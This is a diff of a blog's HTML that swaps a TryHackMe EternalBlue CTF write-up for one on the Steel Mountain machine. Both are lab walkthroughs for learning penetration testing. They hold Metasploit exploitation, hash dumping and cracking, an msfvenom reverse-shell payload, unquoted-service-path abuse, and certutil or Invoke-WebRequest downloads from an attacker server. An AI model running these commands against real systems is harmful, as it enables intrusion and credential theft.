@@ -6,10 +6,10 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>Tryhackme Blue Ctf Writeup</title>
-  <meta name='description' content='Deploy & hack into a Windows machine, leveraging common misconfigurations issues.'>
+  <title>THM Steel Mountain CTF Writeup</title>
+  <meta name='description' content='Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a ...'>
 
-  <link rel="canonical" href="http://localhost:4000/2021/10/09/tryhackme-blue-ctf-writeup/">
+  <link rel="canonical" href="http://localhost:4000/2021/12/22/thm-steel-mountain-ctf-writeup/">
   <link rel="alternate" type="application/rss+xml" title=":~$ BBSec_" href="/feed.xml">
 
   <!-- Fonts -->
@@ -17,6 +17,8 @@
 
   <!-- Ionicons -->
   <link href="https://unpkg.com/ionicons@4.2.2/dist/css/ionicons.min.css" rel="stylesheet">
+
+  <script src="https://kit.fontawesome.com/b8cebea34c.js" crossorigin="anonymous"></script>
 
   <style>
   
@@ -26,6 +28,7 @@
 
   </style>
 </head>
+
 
 <body>
   
@@ -96,6 +99,14 @@
       <li class="nav__item">
         <a href="/tag/tryhackme-machines/" class="nav__link">THM</a>
       </li>
+      
+    
+  
+    
+      
+    
+  
+    
       
     
   
@@ -416,6 +427,14 @@
       
     
   
+    
+      
+    
+  
+    
+      
+    
+  
 </ul>
         </div>
       </div>
@@ -467,7 +486,7 @@
       
       <div class="col col-6 col-t-12">
         <div class="image-box">
-          <img class="post-image lazy" data-src="/assets/img/posts/tryhackme-blue-ctf-writeup/bluebanner.png" alt="Tryhackme Blue Ctf Writeup">
+          <img class="post-image lazy" data-src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/steelbanner.jpg" alt="THM Steel Mountain CTF Writeup">
         </div>
       </div>
       
@@ -479,14 +498,14 @@
             <span class="post__minutes">
               
               
-                5 min read
+                7 min read
               
               <time class="post__date"
-                datetime="2021-10-09T00:59:00+01:00">Oct 9, 2021</time>
+                datetime="2021-12-22T21:50:00+00:00">Dec 22, 2021</time>
             </span>
           </div>
         
-          <h2 class="post__title">Tryhackme Blue Ctf Writeup</h2>
+          <h2 class="post__title">THM Steel Mountain CTF Writeup</h2>
         
           <div class="post__bottom">
         
@@ -507,13 +526,15 @@
                 
                 <a href="/tag/pentesting" class="post__tag">pentesting</a>
                 
-                <a href="/tag/metasploit" class="post__tag">metasploit</a>
-                
                 <a href="/tag/remote-code-execution" class="post__tag">remote-code-execution</a>
                 
-                <a href="/tag/buffer-overflow" class="post__tag">buffer-overflow</a>
+                <a href="/tag/windows-privesc" class="post__tag">windows-privesc</a>
                 
-                <a href="/tag/cracking" class="post__tag">cracking</a>
+                <a href="/tag/powershell" class="post__tag">powershell</a>
+                
+                <a href="/tag/metasploit" class="post__tag">metasploit</a>
+                
+                <a href="/tag/unqoted-service-path" class="post__tag">unqoted-service-path</a>
                 
               </span>
               
@@ -531,15 +552,18 @@
   <article class="post animate">
 
     <div class="post__content">
-      <p><a href="https://www.tryhackme.com/room/blue"><strong>Solve Yourself »</strong></a></p>
+      <p><a href="https://tryhackme.com/room/steelmountain"><strong>Solve Yourself »</strong></a></p>
 
-<p>Blue is a machine that specifically designed to cover EternalBlue (CVE-2017-0144), 
-which allows remote attackers to execute arbitrary code via crafted packets, 
-aka “Windows SMB Remote Code Execution Vulnerability.” 
-<br />
-<br /></p>
-<h2 id="1-enumeration">1-Enumeration</h2>
+<p>The steel mountain is a windows machine. In order to hack into the machine, we are going to exploit  two different 
+vulnerabilities that occur on the system.</p>
 
+<h1 id="first-method">FIRST METHOD</h1>
+<h2 id="1-preperation">1-Preperation</h2>
+<p>Export the ip address of the machine as a variable for shorthand usage.
+<br />-&gt; export ip={MACHINE IP}
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/2.jpg" alt="" class="normal" /></p>
+
+<h2 id="2-enumeration">2-Enumeration</h2>
 <p>Let us run Network Mapper (<strong>nmap</strong>) to discover opened ports and services.</p>
 
 <table>
@@ -555,8 +579,8 @@ aka “Windows SMB Remote Code Execution Vulnerability.”
       <td style="text-align: left">Probe open ports to determine service/version info</td>
     </tr>
     <tr>
-      <td style="text-align: left">-sC or –script=default</td>
-      <td style="text-align: left">Performs a script scan using the default set of scripts</td>
+      <td style="text-align: left">-sS</td>
+      <td style="text-align: left">SYN, half TCP scan</td>
     </tr>
     <tr>
       <td style="text-align: left">-O</td>
@@ -570,85 +594,46 @@ aka “Windows SMB Remote Code Execution Vulnerability.”
       <td style="text-align: left">-p-</td>
       <td style="text-align: left">Scan all 65536 ports</td>
     </tr>
+    <tr>
+      <td style="text-align: left">-Pn</td>
+      <td style="text-align: left">Skip host discovery</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-oN</td>
+      <td style="text-align: left">Write output to a file</td>
+    </tr>
   </tbody>
 </table>
 
-<p>Full command :</p>
+<p>Full command:</p>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap &lt;machine IP&gt; <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-O</span> <span class="nt">-T4</span> <span class="nt">-p-</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-sV</span> <span class="nt">-sS</span> <span class="nt">-O</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="o">{</span>machine IP<span class="o">}</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> <span class="o">{</span>outputfile<span class="o">}</span></code></pre></figure>
 
-<p><img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue2.jpg" alt="Desktop View" style="max-width: 80%" class="normal" /> 
-<br />
-It seems like plenty of services are enabled in the system.However one of them catches the eye.</p>
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/3.jpg" alt="" class="normal" /><br /><br />
+There is a web server running on port <strong>80</strong>, let us visit.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/4.jpg" alt="" class="normal" /><br /><br />
+There is also one more web server is running at port <strong>8080</strong>
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/5.jpg" alt="" class="normal" /><br /><br />
+If you click on the <strong>HttpFileServer2.3</strong> link under the <strong>Server Information</strong> heading, it will redirect you to the following page.
+It seems the HTTP server is being run by <strong>rejetto</strong>.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/6.jpg" alt="" class="normal" /><br /><br />
+There is a vulnerablity on the <strong>Rejetto HFS versions 2.3, 2.3a, and 2.3b</strong>, let’s check.<br />
+<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287"><strong>CVE-Database -&gt; Rejetto HFS 2.3</strong></a>
+<br /><a href="https://www.kb.cert.org/vuls/id/251276"><strong>More detailed explaination</strong></a>
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/7.jpg" alt="" class="normal" /><br /><br /></p>
 
-<p><em><strong>445 /tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup : WORKGROUP)</strong></em></p>
+<h2 id="3-exploitation">3-Exploitation</h2>
 
-<p>After went through the web searching phase for that specific service, we got this:</p>
+<h3 id="gaining-access-to-the-system---getting-user-flag">Gaining Access to the System - Getting User Flag</h3>
+<p>Launch up your <strong>msfconsole</strong> and do a search for <strong>CVE-2014-6287</strong> to see if there is any exploit that we can use.
+There is one with an excellent rank, awesome! Let us use it.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/8.jpg" alt="" class="normal" /><br /><br />
+Copy the THM IP with that command:</p>
 
-<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144"><strong>CVE-2017-0144 - EternalBlue SMB Remote Code Execution (MS17-010)</strong></a>
-<br /></p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ifconfig | <span class="nb">grep</span> <span class="nt">-C</span> 1 tun0 | <span class="nb">tail</span> <span class="nt">-n</span> 1 | <span class="nb">awk</span> <span class="s1">'{print $2}'</span></code></pre></figure>
 
-<h2 id="2-exploitation">2-Exploitation</h2>
-
-<p>Let’s use <strong>Metasploit</strong> framework
-<br />
-<img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue3.jpg" alt="Desktop View" class="normal" />
-<br />
-And than use <strong>MS17-010</strong>
-<img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue4.jpg" alt="Desktop View" class="normal" />
-<br /></p>
-
-<p>Six modules are showed up, two of them are auxiliary modules and the rest are exploiting scripts.In a real-life scenario it is not that obvious that those pre-arranged scripts would work.It is highly possible that target system would crash if you ran any careless exploit to target system or you are not sure host is vulnerable to it. To check this we can run <strong>auxiliary module</strong>.</p>
-
-<p>If you are not familiar with what an auxiliary module is, it is some kind of script that helps us to verify if the target system is vulnerable to our actual exploit or not, without crashing or corrupting the system.
-More technical description would be as following; An auxiliary module does not execute a payload. It can be used to perform arbitrary actions that may not be directly related to exploitation. Examples of auxiliary modules include scanners, fuzzers, and denial of service attacks.</p>
-
-<p>In this case Metasploit database offers us those two auxiliary files, run:</p>
-
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">use auxiliary/scanner/smb/smb_ms17_010</code></pre></figure>
-
-<p>Than set RHOSTS  as IP address of  our target machine, and run it.
-<img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue5.jpg" alt="Desktop View" class="normal" />
-<br />
-As you can see, the output tells us the that, <strong>Host is likely VULNERABLE to MS17-010 !!!</strong> 
-After that point we got our proof that the exploit would work.So let us move to the exploitation phase.</p>
-
-<p><em>Exploit - An exploit module executes a sequence of commands to target a specific vulnerability found in a system or application. An exploit module takes advantage of a vulnerability to provide access to the target system. Exploit modules include buffer overflow, code injection, and web application exploit.</em></p>
-
-<p>Run:</p>
-
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">use exploit/windows/smb/ms17_010_eternalblue</code></pre></figure>
-
-<p>Like the previous auxiliary module, set RHOSTS as our target machine and run it.
-<img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue6.jpg" alt="Desktop View" class="normal" />
-<br />
-<img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue7.jpg" alt="Desktop View" class="normal" />
-<br />
-Congrats !!! You’ve hacked into the machine by using MS17-010 vulnerability.Now we have got our Meterpreter shell which provides additional powerful tools.</p>
-
-<p>Now we need to use <strong>getsystem</strong> command,which is provided by Metasploit’s meterpreter shell, that will use number of different techniques in attempt to gain SYSTEM level priveleges on the remote target. 
-<img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue8.jpg" alt="Desktop View" class="normal" />
-<br />
-Now, lets list all runnig processes with <strong>ps</strong> command, we will need to migrate our suspicious process into trusted process to ensure consistency.
-<img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue9.jpg" alt="Desktop View" class="normal" />
-<br />
-SearchIndexer.exe seems like a good candidate to migrate our process.So type migrate {PID} to migrate spoolsv.exe, which is our reverse tcp payload.</p>
-
-<p>Right now we have %100 access to target system and our session’s persistance is solid, lets move on for crediantels and flags.
-<br /></p>
-
-<h2 id="3-post-exploitation---capturing-the-flags">3-Post Exploitation - Capturing the Flags</h2>
-<p>Just like the getsystem command, meterpreter provides <strong>hashdump</strong> command, which brings the system hashes for us.
-<img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue10.jpg" alt="Desktop View" class="normal" />
-<br />
-We need to find out what kind of hashes they are. It is easy to tell they are NTLM hashes, because Windows is using NTLM hashes for system as default but for the best practice, lets use a hash analyzer to identify the type, you can use any hash analyzer.
-<img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue11.jpg" alt="Desktop View" class="normal" />
-<br />
-As you can see, it is <strong>NTLM</strong>.</p>
-
-<p>So, as we know the hash type, we can move forward for to cracking it.I will use <strong>John the Ripper</strong>,you can use <strong>Hashcat</strong> or any other cypher cracking tool.
-<img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue12.jpg" alt="Desktop View" class="normal" />
-<br /></p>
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/9.jpg" alt="" class="normal" /><br /><br />
+-&gt; set RPORT <strong>8080</strong><br />-&gt; set RHOST <strong>machine IP</strong><br />-&gt; set LHOST <strong>your THM IP</strong><br />-&gt; exploit</p>
 
 <table>
   <thead>
@@ -659,55 +644,181 @@ As you can see, it is <strong>NTLM</strong>.</p>
   </thead>
   <tbody>
     <tr>
-      <td style="text-align: left">hashes</td>
-      <td style="text-align: left">ASCII Text file, which contains copied hashes.</td>
+      <td style="text-align: left">RPORT</td>
+      <td style="text-align: left">The target port (TCP)</td>
     </tr>
     <tr>
-      <td style="text-align: left">–wordlist</td>
-      <td style="text-align: left">Location of the wordlist</td>
+      <td style="text-align: left">RHOST</td>
+      <td style="text-align: left">Address of the target</td>
     </tr>
     <tr>
-      <td style="text-align: left">-format</td>
-      <td style="text-align: left">Hash format</td>
+      <td style="text-align: left">LPORT</td>
+      <td style="text-align: left">The listen port</td>
     </tr>
   </tbody>
 </table>
 
-<p>We’ve cracked the first hash.</p>
+<p><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/10.jpg" alt="" class="normal" /><br /><br />
+After receiving meterpreter session, run <strong>shell</strong> to get an interactive shell.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/11.jpg" alt="" class="normal" /><br /><br />
+Find the flag under <strong>C:\users\bill\Desktop</strong> directory.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/12.jpg" alt="" class="normal" /><br /><br /></p>
 
-<p>Now type shell to use windows’ shell instead of meterpreter shell and start looking for flags.</p>
-<h4 id="flag1txt">flag1.txt</h4>
-<p><img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue13.jpg" alt="Desktop View" class="normal" />
-<br /></p>
-<h4 id="flag2txt">flag2.txt</h4>
-<p><img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue14.jpg" alt="Desktop View" class="normal" />
-<br /></p>
-<h4 id="flag3txt">flag3.txt</h4>
-<p><img src="/assets/img/posts/tryhackme-blue-ctf-writeup/blue15.jpg" alt="Desktop View" class="normal" />
+<h3 id="escalate-the-privileges---getting-the-root-flag">Escalate the privileges - Getting the Root flag</h3>
+
+<p>After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
+permissions against the system. <strong>PowerUp.ps1</strong> is a program that facilitates fast checks in a windows machine to identify 
+any misconfigurations and privilege escalation possibilities.
+<br />-&gt; <a href="https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1"><strong>Download PowerUp.ps1</strong></a>
+<br />-&gt; <a href="https://github.com/PowerShellMafia/PowerSploit"><strong>PowerSploit GitHub Repo</strong></a>
+<br />-&gt; Run <strong>exit</strong> and get back to the <strong>meterpreter</strong> session.
+<br />-&gt; Upload the script just as we did before to the machine.
+<br />-&gt; Run <strong>load powershell</strong>
+<br />-&gt; Run <strong>powershell_shell</strong>
+<br />You will get <strong>PowerShell</strong> this time instead of a regular <strong>cmd prompt</strong>.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/13.jpg" alt="" class="normal" /><br /><br />
+<br />-&gt; Run <strong>. .\PowerUp.ps1</strong>
+<br />-&gt; Run <strong>Invoke-AllChecks</strong>
+<br /><strong>InvokeAllChecks</strong> will diagnose any detectable vulnerabilities along with their descriptions.
+<br /><br />The first result we got is a service called <strong>AdvancedSystemCare9</strong>, and it has a vulnerability called 
+<strong>Unquoted Service Path</strong> <a href="https://www.bbsec.net/2021/12/23/unquoted-service-path-vulnerability/"><strong>-&gt; Read more about it</strong></a>. We will abuse this vulnerability. 
+<br /><strong>CanRestart</strong> field means that the current user, in this case, <strong>bill</strong>, can manually restart the service even though
+the service itself is being run with <strong>LocalSystem</strong> service account permissions, which has the top-level privileges.
+<br /><a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN"><strong>LocalSystem Service Account</strong></a>
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/14.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>Launch up <strong>msfvenom</strong> to deploy a reverse shell binary.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parameter</th>
+      <th style="text-align: left">Functionality</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">LHOST</td>
+      <td style="text-align: left">The IP address that the reverse shell will connect</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">LPORT</td>
+      <td style="text-align: left">The port that the reverse shell will connect</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-p</td>
+      <td style="text-align: left">Payload to use</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-o</td>
+      <td style="text-align: left">Name of the file</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-f</td>
+      <td style="text-align: left">File type of the output binary</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Full command:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">={</span>THM IP<span class="o">}</span> <span class="nv">LPORT</span><span class="o">={</span>RANDOM FREE PORT<span class="o">}</span> <span class="nt">-f</span> exe <span class="nt">-o</span> <span class="o">{</span>somename<span class="o">}</span>.exe</code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/15.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>-&gt; Upload the binary to the target machine.
+<br />-&gt; Get the <strong>shell</strong> again.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/16.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>-&gt; Relocate the binary into <strong>C:\Program Files (x86)\IObit</strong> directory.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/17.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>-&gt; Rename the binary to <strong>Advanced.exe</strong>.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/18.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>Start a <strong>netcat</strong> listener on your machine with the port that is defined when creating
+the backdoor.</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">nc</span><span class="w"> </span><span class="nt">-nvlp</span><span class="w"> </span><span class="p">{</span><span class="n">SPECIFIED</span><span class="w"> </span><span class="nx">PORT</span><span class="p">}</span></code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/nc.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>After starting a netcat session, restart the service</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">sc</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span></code></pre></figure>
+
+<p><br />When the service boots, <strong>Advanced.exe</strong> backdoor binary will be executed instead of the <strong>ASCService.exe</strong>. 
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/19.jpg" alt="" class="normal" /><br /><br />
+You can find the root flag <strong>root.txt</strong> under <strong>C:\Users\Administrator\Desktop</strong> directory.</p>
+
+<h1 id="second-method">SECOND METHOD</h1>
+
+<p>In this section, instead of using Metasploit and automatizing the process, we will be doing all those steps manually.</p>
+
+<h2 id="1-preperation-1">1-Preperation</h2>
+<p><br />-&gt; Copy <strong>Advanced.exe</strong> or create a new backdoor executable with <strong>msfvenom</strong> just like before.
+<br />-&gt; Download <a href="https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat"><strong>winPEAS.bat</strong></a>
+<br />-&gt; Download static binary <a href="https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe"><strong>nc.exe</strong></a>
+<br />-&gt; Download <a href="https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1"><strong>PowerUp.ps1</strong></a> or use the previous one if you downloaded it before.
+<br />-&gt; Download <a href="https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/cve20146287.py"><strong>CVE-2014-6287.py</strong></a> or from <a href="https://www.exploit-db.com/exploits/39161"><strong>Exploitdb</strong></a>
+<br /><br />Your directory should look like this
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/20.jpg" alt="" class="normal" /><br /><br /></p>
+<h2 id="2-exploitation">2-Exploitation</h2>
+<p>Edit the <strong>cve20146287.py</strong> file, set the <strong>ip_addr</strong> field to your THM IP, and set the <strong>local_port</strong> to any free port.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/25.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>Start a <strong>netcat</strong> listener on the port you declared in the <strong>python</strong> file.
+<br />Run it twice. At first run the server will download <strong>nc.exe</strong> static binary from your server. At second, it will run
+<strong>nc.exe</strong> to connect to your local machine by providing a CMD prompt.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/21.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p><br />It is possible to use PowerUp.ps1 again or <strong>winPEAS.bat</strong> can be used to enumerate misconfigurations.
+<br />You can download any file from the running python server by using one of these utilites.</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="p">{</span><span class="n">YOUR</span><span class="w"> </span><span class="nx">SERVER</span><span class="w"> </span><span class="nx">IP</span><span class="p">(</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">)}:</span><span class="mi">80</span><span class="n">/</span><span class="p">{</span><span class="n">THE</span><span class="w"> </span><span class="nx">FILE</span><span class="w"> </span><span class="nx">YOU</span><span class="w"> </span><span class="nx">WANT</span><span class="w"> </span><span class="nx">TO</span><span class="w"> </span><span class="nx">DOWNLOAD</span><span class="p">}</span></code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/22.jpg" alt="" class="normal" /><br /><br />
+As it can be seen from the output, this time, winPEAS provided the information about the vulnerability on <strong>Advanced System Care9</strong>
+service and many others.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/23.jpg" alt="" class="normal" /><br /><br />
+You will need to repeat previous steps to get the root flag. Download <strong>Advanced.exe</strong> with <br /><strong>Invoke-WebRequest</strong> or
+<strong>certutil</strong>, start a Netcat listener and restart the service.
 <br />
-Congrats! End of the machine.</p>
-
+<br />
+Thank you for following, wish you more penetrations ;)</p>
 
     </div>
 
     <div class="post__share">
       <div class="share__list">
-        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/2021/10/09/tryhackme-blue-ctf-writeup/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
+        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/2021/12/22/thm-steel-mountain-ctf-writeup/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
 
-        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=Tryhackme%20Blue%20Ctf%20Writeup&url=http://localhost:4000/2021/10/09/tryhackme-blue-ctf-writeup/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
+        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=THM%20Steel%20Mountain%20CTF%20Writeup&url=http://localhost:4000/2021/12/22/thm-steel-mountain-ctf-writeup/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
 
-        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=http://localhost:4000/2021/10/09/tryhackme-blue-ctf-writeup/&amp;media=http://localhost:4000/assets/img/posts/tryhackme-blue-ctf-writeup/bluebanner.png&amp;description=Tryhackme%20Blue%20Ctf%20Writeup" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
+        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=http://localhost:4000/2021/12/22/thm-steel-mountain-ctf-writeup/&amp;media=http://localhost:4000/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/steelbanner.jpg&amp;description=THM%20Steel%20Mountain%20CTF%20Writeup" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
       </div>
     </div>
 
     <div class="post__navigation">
       
+      <a class="prev" href="/2021/11/18/add-windows-boot-manager-to-grub/">
+        <img class="post__nav-image lazy" data-src="/assets/img/posts/add-windows-boot-manager-to-grub/wgbanner.png" alt="Add Windows Boot Manager to Grub">
+        <div class="post__nav-box">
+          <div class="post__nav post__nav__prev"><i class="ion ion-md-arrow-round-back"></i> Previous Post</div>
+          <h4 class="post__nav__title">Add Windows Boot Manager to Grub</h4>
+        </div>
+      </a>
       
-      <a class="next" href="/2021/10/09/tryhackme-vulnversity-ctf-writeup/">
-        <img class="post__nav-image lazy" data-src="/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vulnbanner.png" alt="Tryhackme Vulnversity Ctf Writeup">
+      
+      <a class="next" href="/2021/12/23/unquoted-service-path-vulnerability/">
+        <img class="post__nav-image lazy" data-src="/assets/img/posts/unquoted-service-path-vulnerability/unquotedbanner.png" alt="Unquoted Service Path Vulnerability">
         <div class="post__nav-box">
           <div class="post__nav post__nav__next">Next Post <i class="ion ion-md-arrow-forward"></i></div>
-          <h4 class="post__nav__title">Tryhackme Vulnversity Ctf Writeup</h4>
+          <h4 class="post__nav__title">Unquoted Service Path Vulnerability</h4>
         </div>
       </a>
       
@@ -750,8 +861,8 @@ Congrats! End of the machine.</p>
               <div class="article__inner">
 
                 
-                <a class="article__image" href="/2021/12/31/tryhackme-hackpark-ctf-writeup/">
-                  <img class="lazy" data-src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/parkbanner.jpg" alt="Tryhackme Hackpark CTF Writeup">
+                <a class="article__image" href="/2021/12/31/thm-hackpark-ctf-writeup/">
+                  <img class="lazy" data-src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/parkbanner.jpg" alt="THM Hackpark CTF Writeup">
                 </a>
                 
 
@@ -768,7 +879,7 @@ Congrats! End of the machine.</p>
                     </span>
                   </div>
 
-                  <h2 class="article__title">Tryhackme Hackpark CTF Writeup</h2>
+                  <h2 class="article__title">THM Hackpark CTF Writeup</h2>
 
                   <p class="article__excerpt">Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!</p>
 
@@ -819,8 +930,8 @@ Congrats! End of the machine.</p>
               <div class="article__inner">
 
                 
-                <a class="article__image" href="/2021/12/28/tryhackme-alfred-ctf-writeup/">
-                  <img class="lazy" data-src="/assets/img/posts/tryhackme-alfred-ctf-writeup/alfredbanner.png" alt="Tryhackme Alfred CTF Writeup">
+                <a class="article__image" href="/2021/12/28/thm-alfred-ctf-writeup/">
+                  <img class="lazy" data-src="/assets/img/posts/tryhackme-alfred-ctf-writeup/alfredbanner.png" alt="THM Alfred CTF Writeup">
                 </a>
                 
 
@@ -833,11 +944,11 @@ Congrats! End of the machine.</p>
                         11 min read
                       
                       <time class="article__date"
-                        datetime="2021-12-28T11:40:00+00:00">Dec 28, 2021</time>
+                        datetime="2021-12-28T08:40:00+00:00">Dec 28, 2021</time>
                     </span>
                   </div>
 
-                  <h2 class="article__title">Tryhackme Alfred CTF Writeup</h2>
+                  <h2 class="article__title">THM Alfred CTF Writeup</h2>
 
                   <p class="article__excerpt">Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.</p>
 
@@ -1010,7 +1121,7 @@ Congrats! End of the machine.</p>
     
     <div class="recent-posts">
       
-      <a class="recent-posts__image" href="/2021/12/31/tryhackme-hackpark-ctf-writeup/"><img class="lazy" data-src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/parkbanner.jpg" alt="Tryhackme Hackpark CTF Writeup"></a>
